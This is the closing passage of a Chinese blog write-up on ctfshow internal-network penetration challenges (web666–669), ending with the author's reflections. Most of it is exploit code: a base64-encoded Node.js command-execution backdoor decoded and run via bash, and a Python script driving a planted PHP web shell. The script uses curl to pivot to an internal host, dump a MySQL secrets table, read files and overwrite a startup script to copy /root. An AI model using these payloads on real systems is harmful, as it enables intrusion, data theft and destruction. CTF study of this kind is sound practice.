YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash&#39;)</span><span class=se>\\</span><span class=s1>&#34;}}}&#34; http://&#39;&#39;&#39;</span><span class=o>+</span><span class=n>ip2</span><span class=o>+</span><span class=s1>&#39;&#39;&#39;:3000/login`;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;a.php&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=n>cmd</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1>#web666</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag_.*?=ctfshow{.*?}&#39;</span><span class=p>,</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;a.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;echo `curl -X POST -d </span><span class=se>\&#34;</span><span class=s2>cmd=mysql -uroot -proot -e &#39;use ctfshow;select * from ctfshow_secret&#39;</span><span class=se>\&#34;</span><span class=s2> http://</span><span class=si>{0}</span><span class=s2>:8033`;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip2</span><span class=p>)})</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=c1>#web668</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag_.*?=ctfshow{.*?}&#39;</span><span class=p>,</span><span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;a.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;echo `curl -X POST -d </span><span class=se>\&#34;</span><span class=s2>cmd=tac secret.txt</span><span class=se>\&#34;</span><span class=s2> http://</span><span class=si>{0}</span><span class=s2>:8033`;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip2</span><span class=p>)})</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;a.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span><span class=s2>&#34;echo `curl -X POST -d </span><span class=se>\&#34;</span><span class=s2>cmd=rm -rf  nodestartup.sh;echo &#39;cat /root/* &gt; /home/node/a.txt &#39; &gt; nodestartup.sh</span><span class=se>\&#34;</span><span class=s2> http://</span><span class=si>{0}</span><span class=s2>:8033`;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip2</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>        <span class=c1>#web669</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;a.php&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                          <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;1&#39;</span><span class=p>:</span> <span class=s2>&#34;echo `curl -X POST -d </span><span class=se>\&#34;</span><span class=s2>cmd=cat a.txt</span><span class=se>\&#34;</span><span class=s2> http://</span><span class=si>{0}</span><span class=s2>:8033`;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ip2</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;flag&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></td></tr></table></div></div><p>这是一个师傅写的借用一下，自己就懒得写了</p><h1 id=小结>小结</h1><p>还是很有意思的，中途卡在了那个xss哪里，一不小心花了300分买提示，气死我了，很多都是看着师傅们的WP写的，找flag找的头晕晕的，很好的一次渗透过程吧，之前没有渗透过</p><p>自己要学的东西还是很多啊，感谢网上的师傅们的博客，学到了一些东西</p><p>起因是因为看pickle反序列化有点看的不爽了，于是就来打了打</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a>
<a href=/tags/mysql/>Mysql</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>